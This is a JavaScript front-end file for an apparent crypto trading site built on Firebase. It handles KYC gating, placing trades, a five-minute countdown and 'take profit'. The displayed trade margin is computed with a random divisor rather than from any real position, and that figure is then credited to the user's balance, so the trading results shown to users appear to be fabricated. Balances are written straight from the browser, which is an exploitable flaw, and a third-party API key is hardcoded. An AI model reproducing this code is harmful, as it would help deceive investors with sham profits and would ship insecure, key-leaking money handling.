// Import the functions you need from the SDKs you need
import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.0/firebase-app.js";
import { getAnalytics } from "https://www.gstatic.com/firebasejs/11.6.0/firebase-analytics.js";
import {
  getAuth,
  onAuthStateChanged,
} from "https://www.gstatic.com/firebasejs/11.6.0/firebase-auth.js";
import {
  getFirestore,
  getDoc,
  doc,
  updateDoc,
} from "https://www.gstatic.com/firebasejs/11.6.0/firebase-firestore.js";

// TODO: Add SDKs for Firebase products that you want to use
// https://firebase.google.com/docs/web/setup#available-libraries

// Your web app's Firebase configuration
// For Firebase JS SDK v7.20.0 and later, measurementId is optional
const firebaseConfig = {
  apiKey: "AIzaSyASg5UlPTgE0HH-iM3HRfeMSY2a2Noa3o4",
  authDomain: "iqtraders1.firebaseapp.com",
  projectId: "iqtraders1",
  storageBucket: "iqtraders1.firebasestorage.app",
  messagingSenderId: "538849101252",
  appId: "1:538849101252:web:ffbbd7906c267ce7231091",
  measurementId: "G-J7LYXPLFWF",
};

const logUser = localStorage.getItem("logId");
const popMessage = document.getElementById("confirmation-popup");
let successIcon = `<dotlottie-player
  src="https://lottie.host/16dbd64b-ed86-44e4-9084-d3bcf3aa5c1c/VoqLrrvykV.lottie"
  background="transparent"
  speed="0.6"
  style="width: auto; height: 300px"
  autoplay
></dotlottie-player>`;
// Initialize Firebase
const app = initializeApp(firebaseConfig);
const analytics = getAnalytics(app);
const auth = getAuth();
const db = getFirestore();

let html = "";

// DIV AND INPUT FUNCTIONS
const profitBtn = document.getElementById("profit-btn");
const tradePrice = document.getElementById("trade-price");
const tradeCurrency = document.getElementById("select-currency");
const stakePrice = document.getElementById("stake-price");
const tradeFee = document.getElementById("trade-fee");
const entryPrice = document.getElementById("entry-price");
const marginPrice = document.getElementById("margin-price");
const timeStamp = document.getElementById("time-stamp");
const placeTradeBtn = document.getElementById("place-trade");
const checkedTerm = document.getElementById("checked-term");

function startCountdown(durationInMinutes, tradeInterval) {
  const durationInSeconds = durationInMinutes * 60;
  let timeLeft = durationInSeconds;

  const countdownInterval = setInterval(function () {
    const minutes = Math.floor(timeLeft / 60);
    const seconds = timeLeft % 60;

    // Display the countdown (you'll need to update an HTML element with this)
    html = `${String(minutes).padStart(2, "0")}:${String(seconds).padStart(
      2,
      "0"
    )}`;

    timeStamp.innerHTML = html;
    timeLeft--;

    if (timeLeft < 0) {
      clearInterval(countdownInterval);
      clearInterval(tradeInterval);
      alert("Trade Ended!");
      window.location.reload();
    }
  }, 1000); // Update every 1 second (1000 milliseconds)
}

onAuthStateChanged(auth, (user) => {
  if (logUser) {
    const docRef = doc(db, "users", logUser);

    getDoc(docRef)
      .then((docSnap) => {
        if (docSnap.exists()) {
          const userData = docSnap.data();

          if (userData.KYC === 0) {
            setTimeout(() => {
              popMessage.style.display = "flex";
              popMessage.innerHTML = `
                  <div class="animation-container-p">
                  <div class="icon-wrapper">
                  <svg class="notification-icon" viewBox="0 0 52 52">
                     <path d="M26 6.3a19.5 19.5 0 0 1 13.8 33.2c.1 2.3-1.9 4-4.1 4H16.3c-2.2 0-4.2-1.7-4.1-4a19.5 19.5 0 0 1 13.8-33.2z"/>
                      <path d="M26 17.5v10.5"/>
                      <path d="M26 39.5a3.5 3.5 0 1 1 0-7 3.5 3.5 0 0 1 0 7z"/>
                  </svg>
                  <div class="text-wrapper text-center">
                      <p>KYC Not Verified!</p>
                      <p>You cannot make any Trade until verification!</p>
                  </div>
                  <div class="popup-buttons">
                    <a href="./kyc.html" class="popup-button confirm-button">Verify Now</a>
                  </div>
                  </div>
                  </div>
              `;
            }, 2000);
          }
          placeTradeBtn.addEventListener("click", () => {
            if (
              tradePrice.value === "" ||
              stakePrice.value === "" ||
              tradeCurrency.value === "" ||
              !checkedTerm.hasAttribute("checked")
            ) {
              popMessage.style.display = "flex";
              popMessage.innerHTML = `
                  <div class="animation-container-p">
                  <div class="x-mark-wrapper">
                      <svg class="x-mark" viewBox="0 0 52 52">
                          <path d="M16 16 36 36M36 16 16 36" />
                      </svg>
                      <div class="text-wrapper">
                          <p>Fill out Parameters!</p>
                      </div>
                  </div>
                  </div>
          `;
              setTimeout(() => {
                popMessage.innerHTML = "";
                popMessage.style.display = "none";
              }, 3500);
            } else if (
              tradePrice.value < 10 ||
              stakePrice.value > 999 ||
              stakePrice.value < 0
            ) {
              popMessage.style.display = "flex";
              popMessage.innerHTML = `
                  <div class="animation-container-p">
                  <div class="x-mark-wrapper">
                      <svg class="x-mark" viewBox="0 0 52 52">
                          <path d="M16 16 36 36M36 16 16 36" />
                      </svg>
                      <div class="text-wrapper">
                          <p>Enter a Proper Value!</p>
                      </div>
                  </div>
                  </div>
          `;
              setTimeout(() => {
                popMessage.innerHTML = "";
                popMessage.style.display = "none";
              }, 3500);
            } else {
              getDoc(docRef)
                .then((docSnap) => {
                  const userData = docSnap.data();
                  let investmentBalance = userData.Investment_Balance;
                  let tradeInvestmentFee =
                    Number(tradePrice.value) + Number(tradeFee.value);

                  if (investmentBalance >= tradeInvestmentFee) {
                    investmentBalance = investmentBalance - tradeInvestmentFee;
                    let updateData = {
                      Investment_Balance: investmentBalance,
                    };
                    updateDoc(docRef, updateData);
                    entryPrice.innerHTML = `$${tradePrice.value}.00`;
                    let currency = tradeCurrency.value;
                    let tradeInterval = setInterval(() => {
                      evaluateData(
                        currency,
                        marginPrice,
                        Number(tradePrice.value)
                      );
                    }, 2000);
                    // Start the 5-minute countdown
                    placeTradeBtn.disabled = "true";
                    placeTradeBtn.style.cursor = "not-allowed";
                    profitBtn.removeAttribute("disabled");
                    profitBtn.style.cursor = "pointer";
                    takeProfit(marginPrice)
                    startCountdown(5, tradeInterval);
                  } else {
                    popMessage.style.display = "flex";
                    popMessage.innerHTML = `
                  <div class="animation-container-p">
                  <div class="x-mark-wrapper">
                      <svg class="x-mark" viewBox="0 0 52 52">
                          <path d="M16 16 36 36M36 16 16 36" />
                      </svg>
                      <div class="text-wrapper">
                          <p>Not enough Balance!</p>
                      </div>
                  </div>
                  </div>
          `;
                    setTimeout(() => {
                      popMessage.innerHTML = "";
                      popMessage.style.display = "none";
                    }, 3500);
                  }
                })
                .catch((error) => {
                  console.error(error);
                });
            }
          });
        }
      })
      .catch((error) => console.error("Error", error));
  }
});

function evaluateData(selectCurrency, marginDiv, tradePrice) {
  const baseUrl = "https://min-api.cryptocompare.com/data/v2/histominute";
  const params = {
    fsym: `${selectCurrency}`,
    tsym: "USD",
    limit: "10",
    api_key: "513e997fdbe398c3d6f430027303e6f9c4a67858e09060645a44bb62eeec463d",
  };
  const url = new URL(baseUrl);
  url.search = new URLSearchParams(params).toString();

  const options = {
    method: "GET",
    headers: { "Content-type": "application/json; charset=UTF-8" },
  };

  fetch(url, options)
    .then((response) => response.json())
    .then((json) => {
      let rate = json.Data.Data[0].low;
      let stakes = Number(
        (rate * Number(tradePrice)) / (generateRandomNumber(0, 1000) * 100)
      ).toFixed(2);
      marginDiv.innerHTML = `$${stakes}`;
    })
    .catch((err) => console.log(err));
}

function generateRandomNumber(min, max) {
  if (
    typeof min !== "number" ||
    typeof max !== "number" ||
    isNaN(min) ||
    isNaN(max) ||
    min > max
  ) {
    return NaN;
  }

  min = Math.ceil(min);
  max = Math.floor(max);
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

function takeProfit(marginPrice) {
  profitBtn.addEventListener(
    "click",
    () => {
      onAuthStateChanged(auth, (user) => {
        const docRef = doc(db, "users", logUser);
        let value = Number(marginPrice.innerHTML.slice(1,))
        getDoc(docRef)
          .then((docSnap) => {
            const userData = docSnap.data();
            let balance = Number(userData.Balance);
            balance = balance + value;
            const updateData = {
              Balance: balance,
            };
            updateDoc(docRef, updateData);
            console.log(balance);
            alert("Profit Taken!");
            profitTrade("Trade Ended\nProfit Deposited in Balance!")
          })
          .catch((error) => console.error(error));
      });
    }
  );
}
function profitTrade(message) {
  popMessage.style.display = "flex";
  popMessage.innerHTML = `
        <div class="animation-container-p">
        <div class="checkmark-wrapper-p">
        ${successIcon}
        <div class="text-wrapper">
        <p>${message}</p>
        </div>
        </div> 
        </div>
        `;

  setTimeout(() => {
    popMessage.innerHTML = "";
    popMessage.style.display = "none";
    window.location.reload();
  }, 7000);
}
